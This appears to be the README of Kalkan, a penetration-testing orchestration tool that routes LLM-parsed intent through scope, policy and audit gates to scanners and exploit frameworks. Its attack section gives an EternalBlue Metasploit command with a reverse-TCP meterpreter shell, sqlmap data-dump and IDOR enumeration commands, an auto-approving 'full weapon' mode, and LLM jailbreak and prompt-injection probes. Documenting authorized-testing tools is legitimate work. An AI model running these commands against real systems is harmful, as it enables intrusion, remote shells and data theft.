# Kalkan

**An ATT&CK + ATLAS–mapped security orchestration core with enforced scope and tamper-evident audit.**

> 📖 Turkish setup/usage guides live under [`docs/`](docs/) (`KURULUM.md`, `KULLANIM.md`, `MIMARI.md`).

Kalkan is **not** an "automated hacker." It is an **execution layer that disciplines authorized testing**.
The model (a local Ollama router, e.g. Qwen3 4B) only structures *intent*. Code decides the command, the scope and the audit.

```
"scan ports on 10.10.10.20, then look for vulnerabilities"
        │
        ▼
   Router (LLM)  ──►  Intent { targets, techniques }   ← JSON only, never a command
        │
        ▼
   Planner       ──►  Playbook (T1046 → nmap, nmap)    ← static table, the model cannot change it
        │
        ▼
   ScopeGuard    ──►  is the target authorized? expired? over the risk ceiling?
        │
        ▼
   Policy        ──►  approval for intrusive? destructive disabled?
        │
        ▼
   Executor      ──►  adapter.run()  ──►  AuditLog (hash chain)
```

---

## 1. Why this design

Telling an LLM to "run this command" creates three problems: **hallucination**, **scope violation** and **non-traceability**.
Kalkan cuts all three structurally:

| Risk | Mitigation |
|---|---|
| Model invents a non-existent command | The model only returns `objective`, `targets`, `techniques` (JSON schema enforced). The technique → tool mapping is fixed in `knowledge/mapping.py`. |
| Going out of scope | Every action passes `ScopeGuard.check()`: CIDR/domain allowlist, deny list, port list, expiry date, risk ceiling. |
| Unapproved intrusive action | `Policy`: `intrusive` and above require approval by default; `destructive` is **off** by default. |
| "No idea what it did" | Every step is written to a hash-chained `AuditLog`; `audit verify` detects a single-line change. |
| Tool missing → crash | Adapters fall back to `dry-run` / `unavailable`; the skeleton runs even with no tools installed. |

**The model never calls `subprocess`.** The `Router` only asks the model over HTTP and validates the returned JSON.

---

## 2. Install

The core has **no external dependencies** (Python 3.11+ standard library only). External scanners (nmap, nuclei, …) are optional — see §4.

```powershell
cd C:\Users\<user>\kalkan
pip install -e .        # installs the 'kalkan' command on PATH (recommended)
kalkan --help
```

> Works without installing too: run `python -m kalkan.cli ...` from the project root.

### Three ways to use it

- **`kalkan`** (no args) → the **home menu**: pick what to do.
- **`kalkan chat`** → an interactive REPL: talk to the model, plan and run.
- **`kalkan <command>`** → direct subcommands (`plan`, `run`, `exploit`, `navigator`, …) for scripting/CI.

---

## 3. Quick start (5 minutes)

### 3.0 Chat (recommended)

```powershell
kalkan chat --target 10.10.10.20
```

Inside the REPL:

```
/target [host]   show/set the session target
/plan <text>     plan only, do not run
/arm             ⚔ FULL WEAPON: arm everything, no prompts, full authority
/cve <CVE-id>    inspect a CVE: score/KEV/CWE + ATT&CK bridge + MSF module
/exploit <CVE|module> [k=v...] [run]   verify (check) / real exploit (run)
/allow destructive on    open policy for a real exploit (run)
/render          render page in Chrome/Edge: Network + XHR/fetch + console + forms
/js <code>       snippet: run JS in the page (returns the result)
/shot            screenshot (PNG evidence)
/risk <level>    risk ceiling (passive|active|intrusive|destructive)
/auto [on|off]   skip the intrusive approval prompt (careful)
/arg k=v ...     arm a single step argument (e.g. verify=1, module=...)
/ozet [on|off]   Turkish model summary after each turn
/feed [tail|status]   latest feed events
/scope [add <h>] show scope / add a target
Ctrl+C           stop a running scan (returns to the prompt — does NOT quit)
/quit · Ctrl+D   exit
```

Anything else you type goes to the model as intent. **Ctrl+C never kills the session** — it cancels the current line or stops the running plan and hands you back the prompt; a second Ctrl+C at an empty prompt (or Ctrl+D) exits.

### 3.1 Scope file

Scope is your written authorization. Nothing touches a target without it.

```powershell
copy examples\scope.json scope.json
# or add a target (this asserts you are AUTHORIZED to test it):
kalkan scope add 10.10.10.20
kalkan scope            # show
```

### 3.2–3.6 Plan, dry-run, run, verify

```powershell
kalkan plan "scan ports on 10.10.10.20"          # plan only
kalkan run  "scan ports on 10.10.10.20" --dry-run # show commands, do not run
kalkan run  "scan ports on 10.10.10.20"           # real run (gated)
kalkan audit verify                                # verify the hash chain
```

Scan reports are written automatically under `reports/` (contains target info — git-ignored).

### 3.8 Live feed — CVE/CVSS + ATT&CK/ATLAS stream

```powershell
kalkan feed status          # CVE store + daemon state
kalkan feed start           # background daemon
kalkan feed tail            # latest events
kalkan vuln top --limit 20  # highest-priority CVEs (CVSS/EPSS/KEV)
```

---

## 4. Enabling tools

Adapters are optional. A missing tool reports `unavailable` instead of crashing. Check readiness with:

```powershell
kalkan tools        # installed tools + status
kalkan coverage     # technique coverage + which tools each playbook needs
```

| Tool | Capability | Risk |
|---|---|---|
| nmap | port/service scan | active |
| httpx | tech fingerprint | active |
| webprobe (built-in) | headers, cookies, CORS, methods, TLS, redirect, **IDOR/BOLA**, **source_recon** | active/intrusive |
| browser (Chrome/Edge via CDP) | render, Network/XHR, console, **snippet (js_eval)**, **DOM-XSS**, screenshot | active/intrusive |
| nuclei | template/CVE scan | active |
| ffuf | content discovery | active |
| wafw00f | WAF detection | passive |
| shodan | passive OSINT | passive |
| sqlmap | SQLi verify/dump | intrusive/destructive |
| dalfox | XSS verify | intrusive |
| msf (Metasploit) | exploit check/run | intrusive/destructive |
| llmprobe (built-in) | LLM/agent tests | passive |

> **Windows + WSL:** if `msfconsole` is installed inside a WSL distro (e.g. Ubuntu), Kalkan detects it and runs it over `wsl -d <distro> -e msfconsole`. Console output is forced to UTF-8 so Turkish-locale (cp1254) terminals do not break decoding.

---

## 5. Attack layer — Metasploit / sqlmap / IDOR

Detection alone is not enough: Kalkan can **verify** a finding and, with explicit authorization, **exploit** it. Every step still passes scope + policy + approval.

### CVE → Metasploit

```powershell
# Verify a module (INTRUSIVE → asks for approval). Resolves the module from the
# curated table, else from the installed Metasploit catalog index (thousands of CVEs).
kalkan exploit 10.10.10.20 CVE-2017-0144

# Real exploit (DESTRUCTIVE → requires scope max_risk=destructive AND --allow-destructive)
kalkan exploit 10.10.10.20 CVE-2017-0144 --mode run \
    --payload windows/x64/meterpreter/reverse_tcp --lhost 10.10.10.5 --allow-destructive

# Direct module path also works:
kalkan exploit 10.10.10.20 exploit/windows/smb/ms17_010_eternalblue --dry-run
```

Inside `chat` the same flow is `/cve CVE-2017-0144` (inspect + resolve module) then `/exploit CVE-2017-0144` (check) or `/exploit CVE-2017-0144 run` (after `/allow destructive on`). After any scan, correlation remembers the top MSF-backed CVE so a bare `/exploit` retries it.

### Web exploitation (sqlmap / dalfox / IDOR)

The `T1190` playbook contains `sqli_check`, `sqli_dump`, `xss_scan`, `idor_probe` and the MSF steps. The risky ones are **opt-in** — they only join the plan when armed:

```powershell
kalkan run "web vuln scan on https://site" --arg verify=1          # SQLi/XSS/IDOR verify (intrusive)
kalkan run "sqli on https://site/item?id=1" --arg dump=1 --allow-destructive  # real data dump
```

**IDOR / Broken Access Control (`idor_probe`)** enumerates an object identifier and emits three signals:
- `idor_enumeration` — neighboring IDs (id±N) return 200 to your session → access to another object (horizontal IDOR);
- `missing_authentication` — a cookie-less request still returns the same object → auth not enforced;
- `bola_horizontal` — a second session (`cookie_b=...`) reads user A's object → **confirmed BOLA** (strongest proof).

```powershell
kalkan run "idor test on https://site/api/orders/42" \
    --arg verify=1 --arg cookie="session=A" --arg cookie_b="session=B"
```

### Full weapon (`/arm`)

In `chat`, `/arm` arms the whole arsenal at once (SQLi verify+dump, dalfox XSS, IDOR/BOLA, browser DOM-XSS, DOM render), raises the risk ceiling to destructive, enables intrusive+destructive policy and turns on auto-approval — it runs without asking and just prints each step as it executes. Scope stays the single honest gate: destructive steps still need the scope file's `max_risk` set to `destructive` for the authorized target.

### Browser / DevTools (Chrome/Edge via CDP)

The `browser` adapter drives a real headless Chrome/Edge over the Chrome DevTools Protocol with a dependency-free, stdlib-only WebSocket client (no Playwright/Selenium); it falls back to `unavailable` if no browser is installed. From `chat`:

```
/render    # render the page with JS; collect Network requests, XHR/fetch (dynamic API endpoints), console, forms/links
/js <code> # DevTools "Snippets": run JS in the page context and get the result back
/shot      # full-page screenshot saved as PNG evidence
```

DOM-XSS verification (`dom_xss`) and page render (`dom_render`) are also wired into the `T1190` / `T1592` playbooks (opt-in via `--arg verify=1` / `--arg render=1`).

### Client-side source recon (`source_recon`)

The webprobe `source_recon` capability is the HTTP-level equivalent of the DevTools **Sources** panel: it extracts the page's loaded scripts, downloads JS bundles, reconstructs the original source tree from **source maps** (`.js.map` → `sources` + `sourcesContent`), and scans everything for embedded secrets, API endpoints and exposed repos (`.git`, `.env`). It is wired into the `T1083` playbook.

> **nuclei note:** nuclei runs are bounded so they finish predictably — `high,critical` severity by default (widen with `--arg severity=low,medium,high,critical`), update-check and interactsh disabled, with concurrency/rate-limit/`max-host-error` caps. Earlier the full template set could exceed even a 900 s timeout.

---

## 6. LLM / agent tests (ATLAS + ATT&CK AI techniques)

```powershell
kalkan run "jailbreak the model" --target http://localhost:11434         # AML.T0054
kalkan run "prompt injection"    --target http://localhost:11434         # AML.T0051 / T1699, T1698
kalkan run "system prompt leak"  --target http://localhost:11434 --arg canary=SECRET123  # AML.T0057
```

The `llmprobe` adapter is built-in (no external binary) and stays `passive`.

---

## 7. Knowledge base (full ATT&CK + ATLAS)

```powershell
kalkan knowledge fetch                       # ATT&CK enterprise (~55 MB), full content
kalkan knowledge fetch --domain atlas        # full ATLAS catalog
kalkan knowledge search "lateral movement"
kalkan knowledge show --technique T1190
```

Each technique loads with full detail: description, detection, platforms, data sources, required permissions, bypassed defenses, sub-techniques, mitigations and procedure examples (which group/software used it).

### ATT&CK Navigator coverage layer

With support from [mitre-attack/attack-navigator](https://github.com/mitre-attack/attack-navigator), Kalkan exports a Navigator **layer** that paints its automation coverage over the whole matrix:

```powershell
kalkan navigator --out kalkan-coverage.json
```

- Techniques with a runnable playbook are colored by their highest step risk (passive → destructive).
- If the ATT&CK dataset is fetched, every uncovered technique is added in grey, so the layer shows the full matrix at a glance.
- Load it at <https://mitre-attack.github.io/attack-navigator/> → *Open Existing Layer → Upload from local*.

---

## 8. Connecting the model as orchestrator

```powershell
# Works without a model (rule-based fallback)
kalkan router "scan ports on 10.10.10.20"

# With a model (local Ollama)
$env:KALKAN_ENDPOINT = "http://localhost:11434"
$env:KALKAN_MODEL    = "kalkan-router:latest"
```

The router forces the model's answer into a strict JSON schema and rejects any technique outside the catalog. If the endpoint is unreachable, a keyword rule-based fallback keeps the system working offline.

---

## 9. Architecture

```
kalkan/
  models.py            Risk, Action, Plan, Intent, ActionResult
  scope.py             ScopeGuard — authorization/scope enforcement
  policy.py            Policy — approval gate (intrusive/destructive)
  audit.py             AuditLog — hash-chained, tamper-evident log
  registry.py          tool registry
  correlate.py         detected product/version → prioritized CVEs → next steps
  orchestrator/
    router.py          LLM intent routing (+ rule fallback, + summary)
    planner.py         deterministic technique → playbook → actions
    executor.py        scope + policy gates, runs adapters, graceful Ctrl+C abort
  knowledge/
    mapping.py         technique → capability → tool playbooks (the heart)
    attack.py          full MITRE ATT&CK (STIX) knowledge base
    atlas.py           MITRE ATLAS knowledge base
    bridge.py          CVE (CWE/keywords) → ATT&CK/ATLAS technique + MSF module
    msfindex.py        CVE → module index from the installed Metasploit catalog
    navigator.py       ATT&CK Navigator coverage-layer exporter
    vuln.py            CVE/CVSS/EPSS/KEV store
    rules.py           detection rule catalog (how a technique looks in logs)
  adapters/            nmap, httpx, webprobe, nuclei, ffuf, wafw00f, shodan,
                       sqlmap, dalfox, msf, llmprobe
  feeds/               live CVE + ATT&CK/ATLAS feed daemon
```

---

## 10. Extending

### 10.1 New tool adapter — `kalkan/adapters/<tool>.py`
Subclass `Adapter`, declare a `ToolSpec`, implement `command()` / `parse()` (and `prepare()`/`cleanup()` if it needs temp files).

### 10.2 New playbook — add a `Playbook` to `_PLAYBOOKS` in `kalkan/knowledge/mapping.py`
Risky steps stay opt-in with `required=("verify",)` so they do not enter a plan without `--arg verify=1`.

---

## 11. Tests

```powershell
python -m pytest -q
```

---

## 12. Limits and ethics

Kalkan is strictly for **authorized** security testing. Adding a target to the scope file is a declaration that you are authorized to test it. The `destructive` tier (real exploitation, data dumping) is off by default and requires both a destructive scope ceiling and `--allow-destructive`. Every action is recorded in a tamper-evident audit log. Use it only against systems you own or are explicitly permitted to test.
